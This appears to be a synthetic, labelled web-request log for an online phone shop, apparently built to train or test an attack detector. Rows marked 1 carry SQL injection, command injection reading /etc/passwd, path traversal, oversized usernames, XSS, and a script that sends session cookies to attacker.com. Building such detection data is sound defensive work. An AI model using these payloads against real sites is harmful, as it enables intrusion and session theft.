+07:44:30.9,103.75.118.228,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+07:44:32.8,103.75.118.228,POST,/search,{'query': 'product; cat /etc/passwd'},1
+07:44:34.9,203.162.4.190,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+07:44:37.7,203.162.4.190,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+07:44:38.7,203.162.4.191,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:44:40.9,192.168.1.50,POST,/search,{'query': 'iphone 15 pro max'},0
+07:44:43.3,192.168.1.185,POST,/search,{'query': 'iphone 15 pro max'},0
+07:44:45.6,192.168.1.56,GET,/auth/register,,0
+07:44:46.9,192.168.1.144,POST,/auth/register,"{'csrf_token': 'Im6ChGgKgNFc1fSE4lxa3Ue6fNoFXox0IR9dreJZKg'.jznTKvvx.ZMXYJ4qjEIeYMBXG5Iy8R7xnQc7b, 'username': 'newuser71', 'email': 'a76@b.com', 'password': 'IwpjdLw4L%CQ', 'submit': 'Register'}",0
+07:44:49.1,192.168.1.28,POST,/search,{'query': 'iphone 15 pro max'},0
+07:44:51.6,192.168.1.50,GET,/,,0
+07:44:53.6,192.168.1.151,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:44:55.0,192.168.1.141,GET,/order/cart,,0
+07:44:57.2,192.168.1.175,GET,/product/1,,0
+07:44:59.2,203.162.4.190,GET,/search?q=<script>alert('XSS')</script>,,1
+07:45:01.4,10.0.0.15,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:45:03.4,203.162.4.191,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+07:45:04.8,192.168.1.162,GET,/,,0
+07:45:06.8,192.168.1.12,POST,/search,{'query': 'iphone 15 pro max'},0
+07:45:09.7,10.0.0.66,GET,/product/2,,0
+07:45:11.5,192.168.1.167,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:45:13.5,10.0.0.15,GET,/product/1,,0
+07:45:15.3,203.162.4.190,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+07:45:16.8,192.168.1.162,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:45:19.2,192.168.1.167,POST,/auth/register,"{'csrf_token': 'Im7rCqZCCFGb4HN3DvIgvGZ8sTKcgCYD8tqn5yQ7ff'.LmkcXRZ4.Bw8zHeIWUckX10q-Ebggi7hFhVA3, 'username': 'newuser74', 'email': 'a93@b.com', 'password': '&D7pYoCM%G0&', 'submit': 'Register'}",0
+07:45:20.8,192.168.1.12,GET,/product/2,,0
+07:45:23.5,203.162.4.190,GET,/search?q=' OR 1=1; --,,1
+07:45:25.0,192.168.1.185,GET,/auth/login,,0
+07:45:27.1,10.0.0.106,GET,/order/myorders,,0
+07:45:29.0,203.162.4.190,GET,/product/1' AND 1=1,,1
+07:45:30.9,192.168.1.46,POST,/auth/login,"{'csrf_token': 'ImEPUAuLNJQMzlM2sVNm4BKGkD4vlbRlEU3fs405Fx'.o7PSkQvE.bUBXHv3k7TPEulYARq8SIhu7oafY, 'username': 'user92', 'password': '2MS85n&Qmor)', 'submit': 'Log in'}",0
+07:45:33.5,10.0.0.67,GET,/product/1,,0
+07:45:35.4,10.0.0.82,GET,/category/Iphone,,0
+07:45:37.4,10.0.0.146,GET,/auth/register,,0
+07:45:39.2,103.75.118.228,GET,/product/1' AND 1=1,,1
+07:45:41.4,103.75.118.228,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+07:45:43.0,203.162.4.190,GET,/product/1,,0
+07:45:45.6,103.75.118.228,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+07:45:47.5,203.162.4.190,GET,/order/myorders,,0
+07:45:49.1,192.168.1.162,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:45:51.4,203.162.4.190,POST,/auth/login,"{'csrf_token': 'ImzGXWb4I80W36ZZOWyxPkWB7PVHXv5CNaR8XejEGr'.8GzfP4gr.YW8oo6qVoRDWnGs3fYxWTKNO6mVZ, 'username': 'user68', 'password': 'V$vkA8Pvfw%t', 'submit': 'Log in'}",0
+07:45:53.5,192.168.1.197,GET,/auth/register,,0
+07:45:55.2,203.162.4.191,POST,/search,{'query': 'product; cat /etc/passwd'},1
+07:45:57.7,203.162.4.191,GET,/search?q=<script>alert('XSS')</script>,,1
+07:45:59.2,203.162.4.191,GET,/search?q=' OR 1=1; --,,1
+07:46:00.9,103.75.118.228,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+07:46:03.3,10.0.0.28,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:46:05.6,192.168.1.28,GET,/order/cart,,0
+07:46:07.3,203.162.4.191,POST,/search,{'query': 'product; cat /etc/passwd'},1
+07:46:08.8,192.168.1.12,POST,/auth/login,"{'csrf_token': 'ImQdoUba40afOXkJ6BMod7HcBgZiqGIjDjojxu5AtT'.PKVS7ihx.1EZYiDPBAZWvQLIrMBYl3Zv_rZzf, 'username': 'user59', 'password': '@jPXq4*)p4*H', 'submit': 'Log in'}",0
+07:46:11.2,203.162.4.190,GET,/search?q=<script>alert('XSS')</script>,,1
+07:46:13.0,203.162.4.191,GET,/search?q=' OR 1=1; --,,1
+07:46:15.3,192.168.1.55,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:46:17.4,192.168.1.18,GET,/,,0
+07:46:19.5,192.168.1.18,GET,/order/myorders,,0
+07:46:21.2,103.75.118.228,POST,/search,{'query': 'product; cat /etc/passwd'},1
+07:46:23.1,192.168.1.104,GET,/,,0
+07:46:25.3,103.75.118.228,GET,/product/1' AND 1=1,,1
+07:46:27.1,103.75.118.228,GET,/../../../../etc/passwd,,1
+07:46:29.3,103.75.118.228,GET,/search?q=' OR 1=1; --,,1
+07:46:31.1,192.168.1.12,GET,/auth/login,,0
+07:46:33.4,203.162.4.191,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+07:46:35.7,192.168.1.104,GET,/auth/logout,,0
+07:46:37.6,203.162.4.191,POST,/auth/register,"{'csrf_token': 'ImHEbteAtvW8ekmT7UL74QQgwc8WJOSuPN5t5imT8g'.fNRjOiEo.nPDCZB2T7EIR5S-mboGe3aIn4ah9, 'username': 'newuser45', 'email': 'a83@b.com', 'password': 'nCCvUFOlqgX5', 'submit': 'Register'}",0
+07:46:39.1,203.162.4.190,GET,/search?q=<script>alert('XSS')</script>,,1
+07:46:40.9,203.162.4.191,GET,/search?q=<script>alert('XSS')</script>,,1
+07:46:42.8,203.162.4.191,GET,/search?q=<script>alert('XSS')</script>,,1
+07:46:45.0,203.162.4.190,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+07:46:47.1,192.168.1.182,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:46:49.0,10.0.0.67,GET,/auth/logout,,0
+07:46:51.4,10.0.0.176,GET,/product/2,,0
+07:46:53.0,203.162.4.190,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+07:46:55.3,203.162.4.190,GET,/../../../../etc/passwd,,1
+07:46:56.9,203.162.4.190,GET,/category/Iphone,,0
+07:46:59.7,103.75.118.228,POST,/search,{'query': 'product; cat /etc/passwd'},1
+07:47:01.2,192.168.1.175,GET,/category/Iphone,,0
+07:47:03.1,103.75.118.228,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+07:47:05.2,103.75.118.228,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+07:47:06.8,192.168.1.18,GET,/auth/login,,0
+07:47:09.6,103.75.118.228,GET,/../../../../etc/passwd,,1
+07:47:11.0,203.162.4.190,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+07:47:12.9,192.168.1.55,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:47:15.1,10.0.0.67,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:47:17.6,192.168.1.56,POST,/auth/login,"{'csrf_token': 'ImGsPWhZISbp0d92QhN3vfFMK4mdmB2aHJKhAHFLBA'.wqY3WQ7i.P6MlhSqrTNG0_laPkf2yKxrFAjUa, 'username': 'user11', 'password': 'qrK5&WYG8uP9', 'submit': 'Log in'}",0
+07:47:18.8,192.168.1.55,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:47:21.1,10.0.0.82,GET,/,,0
+07:47:23.5,103.75.118.228,GET,/search?q=<script>alert('XSS')</script>,,1
+07:47:25.3,192.168.1.175,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:47:27.6,103.75.118.228,GET,/search?q=<script>alert('XSS')</script>,,1
+07:47:29.7,103.75.118.228,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+07:47:30.9,203.162.4.191,GET,/search?q=<script>alert('XSS')</script>,,1
+07:47:32.8,192.168.1.175,POST,/auth/register,"{'csrf_token': 'ImZrSi8pmVDBqvuVYIHUCuiJ2aHvF74zhTyb0XjuIJ'.cimNJYJT.CwFqlCGs0zzm1HB3EVGsDHTOvlil, 'username': 'newuser100', 'email': 'a96@b.com', 'password': 'CV&CO$%c$5sK', 'submit': 'Register'}",0
+07:47:35.2,192.168.1.162,GET,/product/2,,0
+07:47:37.3,192.168.1.18,GET,/auth/login,,0
+07:47:39.0,192.168.1.167,GET,/auth/register,,0
+07:47:41.3,192.168.1.55,GET,/order/cart,,0
+07:47:43.3,192.168.1.141,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:47:45.6,127.0.0.1,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:47:47.1,103.75.118.228,GET,/../../../../etc/passwd,,1
+07:47:49.0,192.168.1.28,GET,/order/cart,,0
+07:47:51.2,103.75.118.228,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+07:47:53.3,10.0.0.79,POST,/auth/login,"{'csrf_token': 'ImvxRZV4WhvC7uDr2w1BcPUvDvWvGu53llvdazXSMH'.1h1Tnxg5.sUCyor1ktcMNp83dUZLl1RLs5e63, 'username': 'user32', 'password': 'F4KV%MG0uQlR', 'submit': 'Log in'}",0
+07:47:54.9,192.168.1.56,GET,/auth/login,,0
+07:47:57.6,103.75.118.228,POST,/search,{'query': 'product; cat /etc/passwd'},1
+07:47:59.3,10.0.0.79,GET,/category/Iphone,,0
+07:48:01.5,192.168.1.46,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:48:03.7,10.0.0.66,POST,/search,{'query': 'iphone 15 pro max'},0
+07:48:05.3,203.162.4.190,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+07:48:06.9,203.162.4.191,GET,/category/Iphone,,0
+07:48:08.9,203.162.4.191,GET,/../../../../etc/passwd,,1
+07:48:11.0,192.168.1.169,GET,/product/1,,0
+07:48:13.5,203.162.4.191,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+07:48:15.3,203.162.4.190,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+07:48:16.8,192.168.1.144,POST,/search,{'query': 'iphone 15 pro max'},0
+07:48:19.0,192.168.1.22,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:48:20.8,192.168.1.46,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:48:23.6,10.0.0.15,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:48:25.6,103.75.118.228,GET,/../../../../etc/passwd,,1
+07:48:27.5,192.168.1.151,POST,/auth/register,"{'csrf_token': 'Im9dR3kKFDGp8zF4fzyyay3cQYocoGfhXwBDKhN3TJ'.sEtfcm4n.gNLdtmeJ7f0wDXa92uOaoVwqNxAU, 'username': 'newuser33', 'email': 'a75@b.com', 'password': 'G6KV&cJhKz)4', 'submit': 'Register'}",0
+07:48:28.9,203.162.4.190,GET,/search?q=<script>alert('XSS')</script>,,1
+07:48:30.8,192.168.1.56,GET,/product/2,,0
+07:48:33.7,203.162.4.190,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+07:48:35.0,192.168.1.167,GET,/product/1,,0
+07:48:37.4,10.0.0.79,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:48:39.5,203.162.4.191,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+07:48:41.1,103.75.118.228,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+07:48:43.6,203.162.4.191,GET,/search?q=<script>alert('XSS')</script>,,1
+07:48:45.0,192.168.1.175,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:48:47.3,203.162.4.190,GET,/product/1' AND 1=1,,1
+07:48:49.7,203.162.4.191,POST,/search,{'query': 'product; cat /etc/passwd'},1
+07:48:51.1,192.168.1.182,GET,/,,0
+07:48:53.0,192.168.1.22,POST,/auth/register,"{'csrf_token': 'ImVwC6UnF7mfOaniVVhkR04n5B6NqPvmAkmW61gWHP'.p7MXeNtn.eWDJBlbeKmBuMCzNqPGU47yZB-Eg, 'username': 'newuser75', 'email': 'a70@b.com', 'password': 'n5s6lf(4sM@0', 'submit': 'Register'}",0
+07:48:54.9,192.168.1.50,POST,/auth/login,"{'csrf_token': 'ImhTD17rf605V5iSn2gDhHX4LkDDd6bMMQi2ECUA8q'.jR8GqqMb.c8Yck81Rplf880VCC5ST3b16Ptvb, 'username': 'user28', 'password': 'IeMSHeIy@&xI', 'submit': 'Log in'}",0
+07:48:57.5,10.0.0.15,GET,/order/cart,,0
+07:48:59.6,10.0.0.106,GET,/product/2,,0
+07:49:01.2,203.162.4.191,GET,/../../../../etc/passwd,,1
+07:49:03.7,203.162.4.191,GET,/auth/login,,0
+07:49:05.7,192.168.1.141,POST,/auth/register,"{'csrf_token': 'ImxPRLpDwxYdCnrLrg1Q7nUObOSVdP5SK25NkRGlfI'.jlj6iWUo.88dgjgE76LjQ5MbFICr_IMzCkVf7, 'username': 'newuser10', 'email': 'a56@b.com', 'password': 'Hhg%e(qA9y%C', 'submit': 'Register'}",0
+07:49:07.1,203.162.4.191,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
+07:49:08.9,203.162.4.190,GET,/../../../../etc/passwd,,1
+07:49:11.2,103.75.118.228,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+07:49:13.1,192.168.1.175,GET,/auth/login,,0
+07:49:15.1,203.162.4.190,GET,/,,0
+07:49:17.3,192.168.1.46,GET,/category/Iphone,,0
+07:49:19.1,192.168.1.104,POST,/auth/register,"{'csrf_token': 'ImZ8ULnZtFdWsoweJUPEaRSZoTuW1vfqWejjj9Vxi7'.RPaBK12D.PWPLTD3RaDt7vSeD5kwIwl_OdRLC, 'username': 'newuser9', 'email': 'a39@b.com', 'password': 'Bc*a!yx9zbt2', 'submit': 'Register'}",0
+07:49:21.7,203.162.4.190,GET,/search?q=<script>alert('XSS')</script>,,1
+07:49:22.9,103.75.118.228,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+07:49:25.4,192.168.1.141,POST,/auth/register,"{'csrf_token': 'ImBQiFeZnwTkt9qijYwi1tpAA2k6GlIgQjHNEPFmEu'.8XshSS4w.PDbbeSomVc8Cgol9nm3990fiGVe5, 'username': 'newuser98', 'email': 'a70@b.com', 'password': '$FUf9Ep2PQ^J', 'submit': 'Register'}",0
+07:49:27.3,10.0.0.106,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:49:29.5,10.0.0.66,GET,/auth/register,,0
+07:49:31.5,192.168.1.56,POST,/search,{'query': 'iphone 15 pro max'},0
+07:49:33.3,203.162.4.191,GET,/product/1' AND 1=1,,1
+07:49:35.1,192.168.1.55,GET,/,,0
+07:49:37.1,192.168.1.104,GET,/auth/login,,0
+07:49:39.2,192.168.1.56,POST,/search,{'query': 'iphone 15 pro max'},0
+07:49:41.1,192.168.1.50,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:49:43.1,203.162.4.190,POST,/order/checkout,"{'address': ""<script>document.location='http://attacker.com/steal_cookie.php?c=' + document.cookie</script>""}",1
+07:49:44.9,203.162.4.190,GET,/../../../../etc/passwd,,1
+07:49:47.0,203.162.4.191,POST,/auth/register,{'username': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'},1
+07:49:49.4,192.168.1.22,POST,/auth/login,"{'csrf_token': 'ImrLr5pljXLm4v8CFnziNhKiAuwj6OFS1u8zJQzidf'.EAiRlmE1.jYM99gvaZUKryYR4u7TppirOcyb_, 'username': 'user12', 'password': 'fTb@t5r4TqCW', 'submit': 'Log in'}",0
+07:49:51.4,192.168.1.55,POST,/auth/login,"{'csrf_token': 'ImTq8HhlgaHtCRIz2aEqLvAo74FP0EJdIqfPUanDrB'.D4xwfNow.v2H-elJNr-2Lci6fdfXBnFjIkQaK, 'username': 'user22', 'password': 'zQr)W0f&DBTQ', 'submit': 'Log in'}",0
+07:49:52.9,10.0.0.195,GET,/order/myorders,,0
+07:49:55.2,192.168.1.169,GET,/,,0
+07:49:57.3,103.75.118.228,GET,/product/1' AND 1=1,,1
+07:49:58.9,203.162.4.191,POST,/search,{'query': 'product; cat /etc/passwd'},1
+07:50:01.0,10.0.0.106,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:50:02.8,10.0.0.67,GET,/order/myorders,,0
+07:50:04.9,203.162.4.190,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+07:50:07.6,10.0.0.66,POST,/auth/login,"{'csrf_token': 'Im3x9vGRD6ha7DBO4b86DWyI9NLf9ZNbXYc7vNbMXy'.JSAWImpP.QxzBGOyGezUtkVm7VsqR01ys7vJO, 'username': 'user30', 'password': 'xq5Jo$*hlh5A', 'submit': 'Log in'}",0
+07:50:09.1,192.168.1.56,GET,/auth/logout,,0
+07:50:11.4,103.75.118.228,POST,/search,{'query': 'product; cat /etc/passwd'},1
+07:50:12.8,10.0.0.195,POST,/auth/login,"{'csrf_token': 'ImvcbuCtafni6XROriRyhBmgUj6NnBjTVGHBJf1X8a'.3pUueytu.wllMmGO8Y-hBt9n6qHh3wnuBTGn2, 'username': 'user100', 'password': 'a$bDteLbXStS', 'submit': 'Log in'}",0
+07:50:15.2,203.162.4.191,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+07:50:17.2,10.0.0.66,GET,/order/myorders,,0
+07:50:18.8,103.75.118.228,GET,/product/1' AND 1=1,,1
+07:50:21.4,10.0.0.176,POST,/order/checkout,"{'name': 'John Doe', 'address': '123 Ba Dinh', 'note': 'Giao hang gio hanh chinh'}",0
+07:50:23.4,103.75.118.228,GET,/../../../../etc/passwd,,1
+07:50:25.5,192.168.1.175,GET,/product/1,,0
+07:50:27.2,10.0.0.79,GET,/product/2,,0
+07:50:28.8,203.162.4.190,GET,/../../../../etc/passwd,,1
+07:50:31.6,103.75.118.228,POST,/auth/login,"{'username': ""admin'--"", 'password': 'any'}",1
+07:50:33.6,192.168.1.12,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:50:35.6,203.162.4.191,GET,/search?q=' OR 1=1; --,,1
+07:50:37.3,103.75.118.228,GET,/../../../../etc/passwd,,1
+07:50:39.2,10.0.0.176,POST,/auth/register,"{'csrf_token': 'Im1ft6e9buqettjaiO9vno1PFDI92MPpNcmfPjpp7u'.yxixy1d1.S6HShy-sbP_pQ0KfODmEOIwJ2p8g, 'username': 'newuser18', 'email': 'a6@b.com', 'password': 'FlRfXe3O8@ja', 'submit': 'Register'}",0
+07:50:41.6,192.168.1.151,POST,/order/update_item/,"{'product_id': '1', 'quantity': '1'}",0
+07:50:43.2,203.162.4.190,GET,/search?q=' OR 1=1; --,,1
+07:50:45.7,192.168.1.182,POST,/search,{'query': 'iphone 15 pro max'},0
+07:50:47.5,192.168.1.28,POST,/auth/register,"{'csrf_token': 'ImnrC5nfYjs3i3NAE1FGVj4iedGWB3sRLStuDbG62F'.jmnZbIC5.OZe0TNbQF5zcuqWthBZKOih_3fIn, 'username': 'newuser20', 'email': 'a98@b.com', 'password': '7qNbLOVT5^Qq', 'submit': 'Register'}",0
+07:50:49.3,203.162.4.191,GET,/product/1' AND 1=1,,1
+07:50:51.4,10.0.0.176,POST,/auth/login,"{'csrf_token': 'ImORnBKovWo5xqNeSIxJlHfhhKTQEsu1tjS3XQcxXS'.l0eGRGDy.QEO2u6x7ldCVfzHtH_AT066F7u_5, 'username': 'user91', 'password': 'C*y3Wp6zpcLs', 'submit': 'Log in'}",0
+07:50:53.3,10.0.0.15,POST,/auth/login,"{'csrf_token': 'ImZkPsUw0PpOpPpRfEQWMvGvHS3RkkB6dULnIKwD9Y'.6RfDeg0U.b7JSZsjQe16Rk9jvGvB6XgdUSpcv, 'username': 'user95', 'password': '9JGXu8nJCShe', 'submit': 'Log in'}",0
+07:50:55.4,203.162.4.191,POST,/auth/login,"{'username': ""' OR 1=1 --"", 'password': 'any'}",1
